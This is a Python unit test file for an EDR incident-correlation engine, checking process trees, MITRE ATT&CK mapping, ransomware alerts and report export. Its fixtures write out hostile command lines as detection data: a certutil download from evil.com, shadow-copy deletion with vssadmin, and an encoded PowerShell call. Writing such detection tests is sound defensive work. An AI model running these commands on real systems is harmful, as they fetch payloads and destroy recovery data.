"""
Unit and integration tests for Enterprise EDR Incident Graph Engine.
Enforces D: drive containment and validates cross-vector correlation and MITRE ATT&CK mapping.
"""

import os
import json
import tempfile
import unittest
from pathlib import Path

from bi_antivirus.core.incident_graph import (
    IncidentGraphEngine,
    EDRIncident,
    IncidentNode,
    IncidentEdge,
    MitreTechnique,
)
from bi_antivirus.database.history import HistoryDatabase

# Strict containment to D: drive
D_DRIVE_SCRATCH = Path(r"D:\bit defender\data\crypto_test_scratch")


class TestEDRIncidentGraph(unittest.TestCase):
    """Test suite validating multi-vector incident correlation and MITRE ATT&CK mapping."""

    def setUp(self):
        D_DRIVE_SCRATCH.mkdir(parents=True, exist_ok=True)
        self.temp_dir = tempfile.TemporaryDirectory(dir=str(D_DRIVE_SCRATCH), ignore_cleanup_errors=True)
        self.db_path = Path(self.temp_dir.name) / "test_edr_history.db"
        self.history_db = HistoryDatabase(db_path=self.db_path)
        self.engine = IncidentGraphEngine(history_db=self.history_db)

    def tearDown(self):
        try:
            self.temp_dir.cleanup()
        except Exception:
            pass

    def test_process_spawn_and_parent_child_linking(self):
        """Verify process creation creates parent-child nodes and directional SPAWNED edge."""
        inc_id = self.engine.ingest_event("PROCESS_SPAWN", {
            "pid": 5010,
            "ppid": 1200,
            "process_name": "worker.exe",
            "parent_name": "service_host.exe",
            "cmdline": "worker.exe --task run",
        })

        self.assertIn(inc_id, self.engine.incidents)
        inc = self.engine.incidents[inc_id]

        self.assertIn("proc:5010", inc.nodes)
        self.assertIn("proc:1200", inc.nodes)

        spawn_edges = [e for e in inc.edges if e.relation == "SPAWNED"]
        self.assertEqual(len(spawn_edges), 1)
        self.assertEqual(spawn_edges[0].source_id, "proc:1200")
        self.assertEqual(spawn_edges[0].target_id, "proc:5010")
        self.assertTrue(any(ev["event_type"] == "PROCESS_SPAWN" for ev in inc.timeline))

    def test_powershell_encoded_command_mitre_mapping(self):
        """Verify encoded PowerShell invocation maps to T1059.001 with concrete evidence."""
        inc_id = self.engine.ingest_event("PROCESS_SPAWN", {
            "pid": 6020,
            "ppid": 1000,
            "process_name": "powershell.exe",
            "cmdline": "powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
        })

        inc = self.engine.incidents[inc_id]
        tech_ids = [t.id for t in inc.mitre_techniques]
        self.assertIn("T1059.001", tech_ids)

        t1059 = next(t for t in inc.mitre_techniques if t.id == "T1059.001")
        self.assertIn("Obfuscated / Encoded execution arguments detected", t1059.evidence)

    def test_lolbin_and_command_shell_mitre_mapping(self):
        """Verify execution of LOLBin certutil and cmd.exe maps to T1218 and T1059.003."""
        inc_id = self.engine.ingest_event("PROCESS_SPAWN", {
            "pid": 7030,
            "ppid": 1000,
            "process_name": "certutil.exe",
            "cmdline": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        })

        inc = self.engine.incidents[inc_id]
        tech_ids = [t.id for t in inc.mitre_techniques]
        self.assertIn("T1218", tech_ids)

        # Ingest command prompt
        self.engine.ingest_event("PROCESS_SPAWN", {
            "pid": 7031,
            "ppid": 7030,
            "process_name": "cmd.exe",
            "cmdline": "cmd.exe /c whoami",
        })

        tech_ids = [t.id for t in inc.mitre_techniques]
        self.assertIn("T1059.003", tech_ids)

    def test_ransomware_and_recovery_inhibition_mitre_mapping(self):
        """Verify ransomware detection triggers T1486 and shadow copy deletion triggers T1490."""
        # 1. Recovery inhibition
        inc_id = self.engine.ingest_event("PROCESS_SPAWN", {
            "pid": 8040,
            "ppid": 1000,
            "process_name": "vssadmin.exe",
            "cmdline": "vssadmin.exe delete shadows /all /quiet",
        })
        inc = self.engine.incidents[inc_id]
        self.assertIn("T1490", [t.id for t in inc.mitre_techniques])

        # 2. Ransomware alert on same process
        self.engine.ingest_event("RANSOMWARE_ALERT", {
            "pid": 8040,
            "pattern": "ENCRYPTION_BURST",
            "extension": ".lockbit",
            "message": "Burst encryption of 10 files",
        })

        tech_ids = [t.id for t in inc.mitre_techniques]
        self.assertIn("T1486", tech_ids)
        self.assertEqual(inc.severity, "CRITICAL")

    def test_cross_vector_correlation_multi_events(self):
        """Verify cross-vector correlation across process, file threat, network, and memory."""
        # Process spawn
        inc_id = self.engine.ingest_event("PROCESS_SPAWN", {
            "pid": 9050,
            "ppid": 2000,
            "process_name": "infiltrator.exe",
            "cmdline": "infiltrator.exe --beacon",
        })

        # File threat
        self.engine.ingest_event("THREAT_DETECTED", {
            "pid": 9050,
            "file_path": r"D:\bit defender\demo_live\infiltrator.exe",
            "threat_name": "Trojan.Win32.Agent",
            "severity": "HIGH",
        })

        # Network connection
        self.engine.ingest_event("NETWORK_CONNECTION", {
            "pid": 9050,
            "dest_ip": "203.0.113.15",
            "dest_port": 443,
            "protocol": "TCP",
        })

        # Memory exploit
        self.engine.ingest_event("MEMORY_EXPLOIT_ALERT", {
            "pid": 9050,
            "process_name": "infiltrator.exe",
            "rwx_regions_count": 2,
            "unbacked_executable_count": 1,
            "findings": ["2 RWX regions detected"],
        })

        inc = self.engine.incidents[inc_id]
        # Multi-source correlation elevates confidence
        self.assertGreaterEqual(inc.confidence, 0.90)
        self.assertEqual(inc.severity, "CRITICAL")
        self.assertIn("T1055", [t.id for t in inc.mitre_techniques])
        self.assertIn("T1071.001", [t.id for t in inc.mitre_techniques])

        # Ensure edges connect nodes properly
        edge_relations = {e.relation for e in inc.edges}
        self.assertIn("SPAWNED", edge_relations)
        self.assertIn("CONNECTED_TO", edge_relations)
        self.assertIn("ACCESSED", edge_relations)

    def test_canonical_json_and_markdown_export(self):
        """Verify export_incident_json and export_incident_markdown produce valid outputs."""
        inc_id = self.engine.ingest_event("PROCESS_SPAWN", {
            "pid": 4455,
            "ppid": 1000,
            "process_name": "powershell.exe",
            "cmdline": "powershell.exe -enc AAAA",
        })

        # JSON Export
        json_str = self.engine.export_incident_json(inc_id)
        parsed = json.loads(json_str)
        self.assertEqual(parsed["incident_id"], inc_id)
        self.assertEqual(len(parsed["nodes"]), 2)
        self.assertIn("mitre_techniques", parsed)
        self.assertIn("timeline", parsed)

        # Markdown Export
        md_str = self.engine.export_incident_markdown(inc_id)
        self.assertIn("# BI Antivirus EDR Forensic Investigation Report", md_str)
        self.assertIn(inc_id, md_str)
        self.assertIn("## 1. Executive Summary", md_str)
        self.assertIn("## 2. MITRE ATT&CK Matrix Alignment", md_str)
        self.assertIn("T1059.001", md_str)
        self.assertIn("## 3. Chronological Forensic Timeline", md_str)
        self.assertIn("## 4. Entity Graph & Process Tree", md_str)
        self.assertIn("## 5. Recommended Remediation & Containment Actions", md_str)

    def test_database_persistence_and_retrieval(self):
        """Verify incidents are automatically persisted and queryable from HistoryDatabase."""
        inc_id = self.engine.ingest_event("PROCESS_SPAWN", {
            "pid": 3322,
            "ppid": 1000,
            "process_name": "test_agent.exe",
            "cmdline": "test_agent.exe",
        })

        inc_list = self.history_db.get_edr_incidents(limit=10)
        self.assertEqual(len(inc_list), 1)
        self.assertEqual(inc_list[0]["incident_id"], inc_id)
        self.assertIsInstance(inc_list[0]["timeline"], list)

        single = self.history_db.get_edr_incident_by_id(inc_id)
        self.assertIsNotNone(single)
        self.assertEqual(single["incident_id"], inc_id)


if __name__ == "__main__":
    unittest.main()
